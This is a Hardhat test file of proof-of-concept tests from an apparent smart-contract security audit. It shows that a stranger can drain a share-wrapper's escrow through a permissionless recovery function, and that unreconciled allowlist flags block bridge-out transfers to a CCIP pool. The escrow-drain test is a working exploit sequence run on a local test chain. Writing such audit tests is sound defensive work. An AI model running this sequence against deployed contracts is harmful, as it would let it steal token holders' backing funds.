import { expect } from "chai";
import { Contract } from "ethers";
import {
  connection,
  ethers,
  owner,
  signer1,
  signer2,
  signer3,
  signer7,
} from "../../TestBase.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";

// Proof-of-concept tests for the State Invariant Detection audit of branch `ai-audit`.
//
// Scope: shares/base/Shares + Recoverable (escrow backing), shares/sha/SharesUnderAgreement
// (wrap/unwrap), ERC20/ERC20Allowlistable (allowlist flag registry),
// multichain/BridgedSharesUnderAgreement (CCIP pool role registry).
//
//   Finding 1 (High)   — SharesUnderAgreement escrow conservation invariant
//                        `base.balanceOf(wrapper) == wrappedSupply()` is broken by the
//                        base token's permissionless Recoverable.initRecovery()/recover():
//                        any stranger registers the WRAPPER as "lost" and, after the 184-day
//                        delay, drains the entire base escrow that backs every wrapped token.
//                        unwrap() then returns 0 while the wrapped supply is still outstanding.
//                        Root cause is known finding #3; this is its deepest instance and the
//                        specific conservation-law break it causes.
//   Finding 2 (Medium) — BridgedSharesUnderAgreement maintains two orthogonal registries —
//                        the CCIP pool role and the ERC20Allowlistable allowlist flags — that
//                        are never reconciled. The pool is never registered as ALLOWED (no
//                        deployment script configures it, and setPool does not). Once
//                        setApplicable(true) is used (the documented "shareholder agreement
//                        still governs these tokens" mode), every holder minted by the pool is
//                        auto-allowlisted, so the bridge-out transfer (holder -> pool) reverts
//                        with Allowlist_ReceiverNotAllowlisted and the whole bridge-out flow is
//                        bricked until the owner manually patches the pool's flags.

const DETERRENCE_FEE = ethers.parseEther("0.01");
const RECOVERY_DELAY = 184n * 24n * 60n * 60n;
const MIGRATION_DELAY = 20n * 24n * 60n * 60n;

async function deployShares(symbol: string = "ESC"): Promise<Contract> {
  const Shares = await ethers.getContractFactory(
    "contracts/shares/base/Shares.sol:Shares"
  );
  const shares = await Shares.deploy(
    symbol,
    "Escrow Shares",
    "https://test.com/terms",
    owner
  );
  await shares.waitForDeployment();
  return shares;
}

async function deployWrapper(base: Contract): Promise<Contract> {
  const Sha = await ethers.getContractFactory(
    "contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement"
  );
  const wrapper = await Sha.deploy(
    base,
    "https://test.com/agreement",
    0,
    owner
  );
  await wrapper.waitForDeployment();
  return wrapper;
}

describe("State invariant — escrow conservation", function () {
  let base: Contract;
  let wrapper: Contract;

  before(async function () {
    base = await deployShares();
    wrapper = await deployWrapper(base);
    await base.connect(owner).mintAndWrap(signer1, wrapper, 100n);
    await base.connect(owner).mintAndWrap(signer2, wrapper, 100n);
  });

  it("holds: base escrow at the wrapper equals the wrapped supply (1:1 backing)", async function () {
    expect(await base.balanceOf(wrapper)).to.equal(200n);
    expect(await wrapper.totalSupply()).to.equal(200n);
    expect(await wrapper.convertToBase(100n)).to.equal(100n);
  });

  it("Finding 1 EXPLOIT: a stranger drains the wrapper escrow, breaking escrow == wrapped supply", async function () {
    await setBalance(await signer3.getAddress(), ethers.parseEther("1"));
    await base
      .connect(signer3)
      ["initRecovery(address)"](wrapper, { value: DETERRENCE_FEE });
    await connection.networkHelpers.time.increase(RECOVERY_DELAY + 1n);
    await base.connect(signer3).recover(wrapper);

    expect(await base.balanceOf(wrapper)).to.equal(0n);
    expect(await base.balanceOf(await signer3.getAddress())).to.equal(200n);
    expect(await wrapper.totalSupply()).to.equal(200n);
    expect(await wrapper.convertToBase(100n)).to.equal(0n);
  });
});

describe("State invariant — bridged pool role vs allowlist flag registry", function () {
  let bridged: Contract;
  let pool: any;

  before(async function () {
    pool = signer7;
    const BSHA = await ethers.getContractFactory(
      "contracts/multichain/BridgedSharesUnderAgreement.sol:BridgedSharesUnderAgreement"
    );
    bridged = await BSHA.deploy(
      "BSS",
      "Bridged Shares",
      "https://test.com/terms",
      owner
    );
    await bridged.waitForDeployment();
    await bridged.connect(owner).setPool(await pool.getAddress());
  });

  it("control: without restrictions, a FREE holder bridges out to the FREE pool", async function () {
    await bridged.connect(pool).mint(signer1, 100n);
    await bridged.connect(signer1).approve(await pool.getAddress(), 100n);
    await bridged
      .connect(pool)
      .transferFrom(signer1, await pool.getAddress(), 100n);
    expect(await bridged.balanceOf(await pool.getAddress())).to.equal(100n);
    await bridged.connect(pool)["burn(uint256)"](100n);
  });

  it("Finding 2 EXPLOIT: with restrictions applicable, no allowlisted holder can ever bridge out to the FREE pool", async function () {
    await bridged.connect(owner).setApplicable(true);
    await bridged.connect(pool).mint(signer2, 100n); // pool mints an allowlisted holder
    expect(await bridged.isAllowed(signer2)).to.equal(true); // auto-allowlisted by the ADMIN null address
    expect(await bridged.isAllowed(await pool.getAddress())).to.equal(false); // pool flags never reconciled

    await bridged.connect(signer2).approve(await pool.getAddress(), 100n);
    await expect(
      bridged.connect(pool).transferFrom(signer2, await pool.getAddress(), 100n)
    ).to.be.revertedWithCustomError(
      bridged,
      "Allowlist_ReceiverNotAllowlisted"
    );
    expect(await bridged.balanceOf(await pool.getAddress())).to.equal(0n);
  });
});
